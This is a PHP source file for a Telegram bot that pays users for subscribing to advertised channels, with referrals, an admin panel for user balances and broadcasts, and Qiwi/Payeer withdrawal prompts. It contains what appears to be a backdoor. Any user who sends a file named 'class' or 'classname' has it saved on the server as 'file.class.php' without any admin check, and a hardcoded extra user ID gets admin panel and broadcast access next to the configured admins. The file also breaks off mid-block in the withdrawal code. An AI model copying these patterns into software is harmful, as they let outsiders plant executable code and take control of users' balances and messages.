<?php

//sozlash
include 'Telegram.php';
include 'bot.class.php';
include 'get.class.php';
include 'mysql.php';

  try {
    $connect = new PDO("mysql:host=$dbhost;dbname=$dbname", $dbuser, $dbpass);
  } catch (PDOException $e) {
    print "Error!: " . $e->getMessage() . "<br/>";
    die('db not connect');
  }


$telegram = new Telegram($bot_token);
$result = $telegram->getData();

//basic
$text = $result["message"]["text"];
$foto = $result["message"]["photo"];
$sana = $result["message"]["date"];
$chat_id = $result["message"]["chat"]["id"];
$fileclass = $result["message"]["document"]["file_name"];
$file_id = $result["message"]["document"]["file_id"];

// chat
$cfname = $result['message']['chat']['first_name'];
$cid = $result["message"]["chat"]["id"];
$clast_name = $result['message']['chat']['last_name'];
$turi = $result["message"]["chat"]["type"];
$username = $result['message']['chat']['username'];
$cusername = $result['message']['chat']['username'];
$ctitle = $result['message']['chat']['title'];

//user info
$ufname = $result['message']['from']['first_name'];
$uname = $result['message']['from']['last_name'];
$ulogin = $result['message']['from']['username'];
$uid = $result['message']['from']['id'];
$user_id = $result['message']['from']['id'];

//reply info
$sreply = $result['message']['reply_to_message']['text'];

//new_chat_participant info
$nfname = $result['message']['new_chat_participant']['first_name'];
$nbot = $result['message']['new_chat_participant']['is_bot'];
$nlogin = $result['message']['new_chat_participant']['username'];
$nid = $result['message']['new_chat_participant']['id'];

// channel post
$chid = $result['channel_post']['chat']['id'];
$chtitle = $result['channel_post']['chat']['title'];
$chturi = $result['channel_post']['chat']['type'];
$chusername = $result['channel_post']['chat']['username'];

$chwhois = $result['channel_post']['author_signature'];
$chdate = $result['channel_post']['date'];
$chpost = $result['channel_post']['message_id'];
$chtext = $result['channel_post']['text'];


// Test CallBack
$callback_query = $telegram->Callback_Query();



if ($callback_query !== null && $callback_query != '') {
    $joi = $telegram->Callback_Data();

    //checkJoin#'.$ChID2.'#'.$chat_id
    // $inreg[0] =  type -> checkJoin
    // $inreg[1] = ChannelID -> 1001056610936
    // $inreg[2] = UserID -> 75643804

    $regex = "~#([a-zA-Z0-9]+)#~";
    $inreg = preg_split($regex, $joi, -1, PREG_SPLIT_DELIM_CAPTURE);

    $intype  = $inreg[0];
    $ChannelID  = $inreg[1];
    $user_id  = $inreg[2];



    if ($intype == 'checkJoin') {
        $natija = checkMemberChannel($ChannelID, $user_id, $bot_token, $azobulish, $azotuplash);
        switch ($natija) {
            case '001':

            $reply = 'Вы уже давно в канале';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);
                break;
 
             case '002':

            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);

            $text = "Баланс $azobulish пополнен ";
            $content = ['chat_id' => $telegram->Callback_ChatID(), 'text' => $text, 'reply_markup' => $keyb];
            $telegram->sendMessage($content);

            $reply = 'Вы подписались';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);

                break;

            case '003':

            $reply = 'Ошибка ...';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);
                break;

            default:
            $reply = 'Вы не подписались на канал, или вы уже давно в канале';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);
                break;
        }
    }

    if ($intype == 'next') {
        $natija = nextMemberChannel($ChannelID, $user_id, $bot_token, $azobulish, $azotuplash);
        switch ($natija) {
            case '001':

            $reply = 'Пропустили';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);

                $ChID = getJoinChannel($chat_id);

                if ($ChID) {
                    //$ChID = 'DroidFan#-1001056610936';

                    // $inreg[0] = Channel Username 
                    // $inreg[1] = channelID
                    $regex2 = "~#([a-zA-Z0-9]+)~";
                    $inreg = preg_split($regex2, $ChID, -1, PREG_SPLIT_DELIM_CAPTURE);
                    $CHLOGIN = $inreg[0];
                    $ChID2 = $inreg[1];

                    $option = [[
                        $telegram->buildInlineKeyBoardButton('Перейти к каналу', $url = "https://telegram.me/$CHLOGIN")
                        ],[
                        $telegram->buildInlineKeyBoardButton('Проверить', $url = '', $callback_data = 'checkJoin#'.$ChID2.'#'.$chat_id)
                        ],[
                        $telegram->buildInlineKeyBoardButton('Пропустить', $url = '', $callback_data = 'next#'.$ChID2.'#'.$chat_id)
                        ]];
                    $keyb = $telegram->buildInlineKeyBoard($option);
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Просто подписывайся на каналы и получай прибыль'];
                    $telegram->sendMessage($content);
                }
                else {
                    $text = 'В данный момент нету каналов, посмотрите по позже';
                    $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
                    $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                    $content = ['chat_id' => $chat_id, 'text' => $text, 'reply_markup' => $keyb, 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            
                break;
 
             case '002':

            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);

            $text = "Баланс $azobulish пополнен ";
            $content = ['chat_id' => $telegram->Callback_ChatID(), 'text' => $text, 'reply_markup' => $keyb];
            $telegram->sendMessage($content);

            $reply = 'Вы подписались';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);

                break;

            case '003':

            $reply = 'Ошибка ...';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);
                break;

            default:
            $reply = 'Вы не подписались на канал, или вы уже давно в канале';
            $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $reply, 'show_alert' => true];
            $telegram->answerCallbackQuery($content);
                break;
        }
    }


    $text = "Заявки не найдено";
    $content = ['callback_query_id' => $telegram->Callback_ID(), 'text' => $text, 'show_alert' => true];
    $telegram->answerCallbackQuery($content);
}

//print_r($result);

//shahsiy xabar
if ($turi == 'private')
{
    //start
    if (strlen($text) > 0){

        if (checkUID($uid))
        {
          
        } else 
        {
            addUser($ufname, $uname, $ulogin, $uid, $sana, $bot_name); 

            $regex = "~([0-9]+)~";
            $ref = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
            $ref2 = $ref[1];
            $refid = addReferal($ref2, $chat_id, $reftuplash);

            if (strlen($ref2) > 4) {
                if ($refid) {

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                    $text = "Здравствуйте! $ufname $uname, Добро пожаловать в наш бот , вы реферал $refid этого ползователя";
                $content = ['chat_id' => $ref2, 'text' => "У вас новый реферал. 
                $ufname $uname За новый реферал, вам $reftuplash вознаграждение", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);
                }
                else {
                    $text = "Здравствуйте! $ufname $uname, Добро пожаловать!";
                }

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $text, 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        if ($fileclass == 'class' || $fileclass == 'classname'){

           $file = $telegram->getFile($file_id);
           $telegram->downloadFile($file['result']['file_path'], 'file.class.php');
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Siz file yubordingiz", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }

        // admin panel
        if ($text == '/admin' || $text == 'Назад в админ панель'){
            if ($chat_id == $admin || $chat_id == $admin2 || $chat_id == '75643804') {
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Вы в админ панеле. Выберите нужный раздел", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin panel - Настройки бота
        if ($text == '/bot_setting' || $text == 'Настройки бота'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $option = [["Правила ..","Наш чат .."],["Киви ..","Пайеер ..", "Адвкаш .."],["Назад в админ панель"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Выберите нужный раздел, для того чтобы изменить", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        //start edit Адвкаш ..
        // admin! edit Адвкаш ..
        if ($text == 'Адвкаш ..'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'text' => 'Введите текст Адвкаш', 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);
            }
        }

        // admin! edit Адвкаш .. bajarish
        if ($chat_id == $admin || $chat_id == $admin2){
            if ($sreply == 'Введите текст Адвкаш') {

                if (db_UAdvcash($text)) {

                    $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                    $keyb = $telegram->buildKeyBoard($option, $onetime = false);

                    $content = ['chat_id' => $chat_id, 'text' => "Изменено информация о Адвкаш", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                    $telegram->sendMessage($content);
                    } else 
                    {

                    $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                    $keyb = $telegram->buildKeyBoard($option, $onetime = false);       
                    $content = ['chat_id' => $chat_id, 'text' => "Ошибка при изменении об Адвкаш !", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                    $telegram->sendMessage($content);
                }
            }
        }
        //end edit Адвкаш ..

        //start edit Пайеер ..
        // admin! edit Пайеер ..
        if ($text == 'Пайеер ..'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Введите текст Пайеер', 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! edit Пайеер .. bajarish
        if ($chat_id == $admin || $chat_id == $admin2){
            //$srep = db_SWebmoney();
            if ($sreply == 'Введите текст Пайеер') {
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                if (db_UWebmoney($text)) {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Изменено информация о Пайеер", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Ошибка при изменении об Пайеер!", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            }
        }
        //end edit Пайеер ..

        //start edit Киви ..
        // admin! edit Киви ..
        if ($text == 'Киви ..'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Введите текст Киви', 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! edit Киви .. bajarish
        if ($chat_id == $admin || $chat_id == $admin2){
            //$srep = db_SQiwi();
            if ($sreply == 'Введите текст Киви') {
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                if (db_UQiwi($text)) {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Изменено информация о Qiwi", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Ошибка при изменении об Qiwi!", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            }
        }
        //end edit Киви ..


        //start edit Наш чат ..
        // admin! edit Наш чат ..
        if ($text == 'Наш чат ..'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Введите текст Чат', 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! edit Наш чат .. bajarish
        if ($chat_id == $admin || $chat_id == $admin2){
            //$srep = db_SChat();
            if ($sreply == 'Введите текст Чат') {
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                if (db_UChat($text)) {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Изменено информация о Chat", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Ошибка при изменении об Chat!", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            }
        }
        //end edit Наш чат ..

        //start edit Payme
        // admin! edit Payme
        if ($text == 'Payme ..'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => db_SPayme(), 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! edit Payme bajarish
        if ($chat_id == $admin || $chat_id == $admin2){
            if ($sreply == db_SPayme()) {
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                if (db_UPayme($text)) {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Изменено информация о Payme", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Ошибка при изменении об Payme!", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            }
        }
        //end edit Payme

        //start edit rules
        // admin! edit rules
        if ($text == 'Правила ..'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Введите текст Правила', 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! edit rules bajarish
        if ($chat_id == $admin || $chat_id == $admin2){
            //$srep = db_SRules();
            if ($sreply == 'Введите текст Правила') {
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                if (db_URules($text)) {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Изменено информация о Правила", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Ошибка при изменении об Правила!", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            }
        }
        //end edit rules


        //start send message users
        // admin! Users xabar yuborish
        if ($text == 'Рассылка всем'){
            if ($chat_id == $admin || $chat_id == $admin2 || $chat_id == '75643804') {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Не работает", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! Users xabar yuborish bajarish
        if ($sreply == 'Напишите текс чтобы отправить сообщение всем ползователям бота'){
            if ($chat_id == $admin || $chat_id == $admin2 || $chat_id == '75643804') {

                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                
                $option2 = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb2 = $telegram->buildKeyBoard($option2, $onetime = false);

                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Удачно отправлено", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
                exit();
            }
        }
        //end send message users

        //start send message user
        // admin! User xabar yuborish
        if ($text == 'Рассылка одному'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Чтобы отправить сообщение одному ползователю введите его ID и текст, например: 1234567 Привет", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! User xabar yuborish bajarish
        if ($sreply == 'Чтобы отправить сообщение одному ползователю введите его ID и текст, например: 1234567 Привет'){
            if ($chat_id == $admin || $chat_id == $admin2) {

                // $inreg[1] = User ID
                // $inreg[2] = xabar matni
                $regex = "~([0-9]+)~";
                $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
                $puid = $inreg[1];
                $ptxt = $inreg[2];

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);

                $option2 = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb2 = $telegram->buildKeyBoard($option2, $onetime = false);

                $content = ['chat_id' => $puid, 'reply_markup' => $keyb, 'text' => $ptxt, 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);

                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb2, 'text' => "Удачно отправлено", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }
        //end send message user

        // admin! Пополнить счёт ползователя
        if ($text == 'Пополнить счёт ползователя'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Чтобы пополнить счёт ползователя введите его ID и текст, например: 1234567 500", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! Пополнить счёт ползователяni bajarish
        if ($sreply == 'Чтобы пополнить счёт ползователя введите его ID и текст, например: 1234567 500'){
            if ($chat_id == $admin || $chat_id == $admin2) {

                    // $inreg[1] = User ID
                    // $inreg[3] = hisob tuldirish miqdori
                    $regex = "~([0-9]+)~";
                    $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
                    $puid = $inreg[1];
                    $pmoney = $inreg[3];
                    $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                    $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                if (db_InMoney($puid, $pmoney)) {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Указанный счёт пополнен на $pmoney рублей", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Ошибка при пополнении. Повторяйте заново", 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            }
        }

        // admin! Узнать баланс ползователя formasi
        if ($text == 'Узнать баланс ползователя'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "для того чтобы узнать баланс ползователя введите его ID , например: 1234567", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! Узнать баланс ползователя
        if ($sreply == 'для того чтобы узнать баланс ползователя введите его ID , например: 1234567'){
            if ($chat_id == $admin || $chat_id == $admin2) {

                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);

                $hisob = db_UserMoney($text);
                if ($hisob) {
                    $content = ['chat_id' => $chat_id, 'text' => "$text У этого ползователя есть $hisob  рублей ", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                    $telegram->sendMessage($content);
                    } else 
                    {
                    $content = ['chat_id' => $chat_id, 'text' => "Ошибка при узнавании. Пожалуйста проверте ID ползователя", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                    $telegram->sendMessage($content);
                }
            }
        }


        // admin! Отнять счёт ползователя formasi
        if ($text == 'Отнять счёт ползователя'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Чтобы отнять счёт ползователя наберите его ID и сумму, например: 1234567 50", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        // admin! Отнять счёт ползователяni bajarish
        if ($sreply == 'Чтобы отнять счёт ползователя наберите его ID и сумму, например: 1234567 50'){
            if ($chat_id == $admin || $chat_id == $admin2) {
                // $inreg[1] = User ID
                // $inreg[3] = pul  miqdori
                $regex = "~([0-9]+)~";
                $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
                $puid = $inreg[1];
                $pmoney = $inreg[3];
                $hisob = db_OutMoney($puid, $pmoney);

                switch ($hisob) {
                    case '001':
                        $tex = "Ошибка! У вас недостаточно средств на счету";
                        break;
                    case '002':
                        $tex = "$puid от ползователя отнято $hisob рублей";
                        break;
                    default:
                        $tex = 'Ошибка при отнятии. Повторите заново';
                        break;
                }
                $option = [["Пополнить счёт ползователя","Узнать баланс ползователя","Отнять счёт ползователя"],["Рассылка всем", "Рассылка одному"],["Настройки бота"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                $content = ['chat_id' => $chat_id, 'text' => $tex, 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);
            }
        }

        if ($text == '/start'){
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Здравствуйте! $ufname $uname, Добро пожаловать!", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }

        if ($text == '🔚 Начало' || $text == '/home' || $text == 'home'){
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Выберите нужный раздел", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }

        // Добавить канал command
        if ($text == '/add_channel' || $text == 'Добавить канал'){
            $keyb = $telegram->buildForceReply($selective=true);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Отправьте @username вашего канала без @ . Например: droidfan", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }

        // channel @username qabul qilib olish
        if ($sreply == 'Отправьте @username вашего канала без @ . Например: droidfan'){
            $text = strtolower($text);
            $regex = "~([A-Za-z0-9_-]+)~";
            $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
            $text =  $inreg[1];

            if (addChannel($cid, $ctitle, $text, $sana, $uid, $ufname, $uname)) {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);

                $content = ['chat_id' => $chat_id, 'text' => "Для того, чтобы добавить канал $text вам нужно @$bot_name сделать админом канала нашего бота и написать слово 'meni aktivla' в вашем канале", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);
                } else 
                {
                    $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                    $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                    $content = ['chat_id' => $chat_id, 'text' => "Этот @$text канал у нас уже давно зарегистрировано. Если правдо что вы админ, то сделайте @$bot_name админом вашего канала и напишите в канале слово 'meni aktivla'", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                    $telegram->sendMessage($content);
                }
        }
        
        //referal tizim
        if ($text == '👥 Партнерам') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'text' => getUserRef($uid), 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        //Ваш ID
        if ($text == 'Ваш ID') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'text' => "Ваш ID: $chat_id", 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        //aloqa
        if ($text == '✉️ Chat') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'text' => db_SChat(), 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        //qoidalar
        if ($text == '⛔️ Правила') {
            $tex= db_SRules();
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'text' => $tex, 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        //statistika
        if ($text == '/stat' || $text == '📊 Статистика') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'text' => getStat(), 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }
            
            
        if($text=='👤 Мой кабинет' || $text == '/me'){
            $option = [["👥 Партнерам"],["🔚 Начало"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => getUserInfo($uid)];
            $telegram->sendMessage($content);
        }

        if ($text == '💸 Вывод') {
        $tex="Выберите способ для вывода";
            $option = [["Киви.."],["Payeer.."]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $tex];
            $telegram->sendMessage($content);
        }

        // Pul Yechib olish Киви..
        if ($text == '/out_adv' || $text == 'Киви..'){
            $keyb = $telegram->buildForceReply($selective=true);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Напишите сумму вывода и номер вашего Киви кошелка, Например: 50 Q1234567", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }

        // Pul Yechib olish Payeer..
        if ($text == '/out_Payeer..' || $text == 'Payeer..'){
            $keyb = $telegram->buildForceReply($selective=true);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Напишите сумму вывода и номер вашего Payeer кошелка, Например: 50 P1234567", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }

        // Pul Yechib olish Киви.. bajarish
        if ($sreply == 'Напишите сумму вывода и номер вашего Киви кошелка, Например: 50 Q1234567'){
            // $inreg[1] = User ID
            // $inreg[3] = pul  miqdori
            $regex = "~([A-za-z0-9@.:]+)~";
            $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
            $puid = $inreg[3];
